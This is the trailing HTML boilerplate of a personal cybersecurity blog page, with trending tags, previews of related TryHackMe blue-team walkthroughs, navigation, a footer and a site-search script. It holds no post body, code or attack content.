          <a href="/posts/python-network-scanner">Network Scanner</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/red-team/">Red Team</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/python/">Python</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/blue-team/">Blue Team</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/bug-bounty/">Bug Bounty</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/vulnerabilities/">Vulnerabilities</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/tools/">Tools</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/2fa-bypass/">2FA Bypass</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/advanced-search/">Advanced Search</a>
      
    </div>
  </section>

            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/ctf-blueteam-conti" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1738450800"
  data-df="ll"
  
>
  Feb  2, 2025
</time>

              <h4 class="pt-0 my-2">THM: Conti</h4>
              <div class="text-muted">
                <p>Walkthrough

CTF Platform: TryHackMe
Level: Medium

Tools Used:

  Splunk
  VirusTotal
  Sysmon


Resources Used:

  Conti: TryHackMe
  Sysmon Event Logs
  Splunk Queries
  CVE Research


Steps for...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/ctf-blueteam-squid-game" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737414000"
  data-df="ll"
  
>
  Jan 21, 2025
</time>

              <h4 class="pt-0 my-2">THM: Squid Game</h4>
              <div class="text-muted">
                <p>Walkthrough

CTF Platform: TryHackMe
Level: Hard

Tools Used:

  olemeta
  oletimes
  oleid
  oledump.py
  vipermonkey


Resources Used::

  Squid Game: TryHackMe


Steps for the CTF



Attacker 1
...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/ctf-blueteam-benign" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737154800"
  data-df="ll"
  
>
  Jan 18, 2025
</time>

              <h4 class="pt-0 my-2">THM: Benign</h4>
              <div class="text-muted">
                <p>Walkthrough

CTF Platform: TryHackMe
Level: Medium

Tools Used:

  Splunk
  VirusTotal (for URL verification)


Resources Used:

  Benign: Tryhackme
  Splunk Query Language (SPL)
  Event ID 4688 lo...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/ctf-blueteam-squid-game"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>THM: Squid Game</p>
    </a>
  

  
    <a
      href="/posts/python-digital-forensics-toolkit"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>Digital Forensics Toolkit</p>
    </a>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    <time>2025</time>

    
      <a href="https://twitter.com/diogo-lages">Diogo Lages</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.2.4"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/red-team/">Red Team</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/python/">Python</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/blue-team/">Blue Team</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/bug-bounty/">Bug Bounty</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/vulnerabilities/">Vulnerabilities</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/tools/">Tools</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/2fa-bypass/">2FA Bypass</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/advanced-search/">Advanced Search</a>
      
    </div>
  </section>

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

